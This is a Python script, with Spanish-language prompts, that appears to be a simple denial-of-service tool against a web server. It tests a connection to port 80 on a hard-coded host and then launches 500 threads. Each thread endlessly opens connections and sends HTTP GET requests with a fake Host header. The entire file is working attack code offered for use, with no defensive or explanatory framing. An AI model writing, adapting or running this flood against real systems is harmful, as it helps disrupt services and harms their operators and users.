import socket,  sys, random, threading
import colorama
from colorama import Fore
from colorama import Style
colorama.init()
try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ip_addres=input("Introduzca la direccion IP o el nombre de host del objetivo:")
    #host=socket.gethostbyname(ip_addres)

    host='192.168.225.230'
    fake_ip='182.21.20.32'
    estado = sock.connect_ex((host,80))
    if estado==0:
            print(Fore.BLUE+"Conexion probada=OK"+Style.RESET_ALL)
            pass
    else:
            print(Fore.RED+"Error - No se pudo conectar al host."+Style.RESET_ALL)
            sys.exit()
    

    attack_num=0
    def attack():
            while True:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((host, 80))
                    s.sendto(("GET /" + host + " HTTP/1.1\r\n").encode('ascii'), (host, 80))
                    s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (host, 80))
                    
                    global attack_num
                    attack_num += 1
                    #print(attack_num)
                    
                    s.close()
                except KeyboardInterrupt:
                    print(Fore.RED+"Se presiono Ctrl+C"+Style.RESET_ALL)
                    sys.exit()
    for i in range(500):
        thread = threading.Thread(target=attack)
        thread.start()
except socket.error:
    print(Fore.RED+"Error - No se pudo conectar al servidor"+Style.RESET_ALL)
    sys.exit()
except KeyboardInterrupt:
    print(Fore.RED+"Se presiono Ctrl+C"+Style.RESET_ALL)
    sys.exit()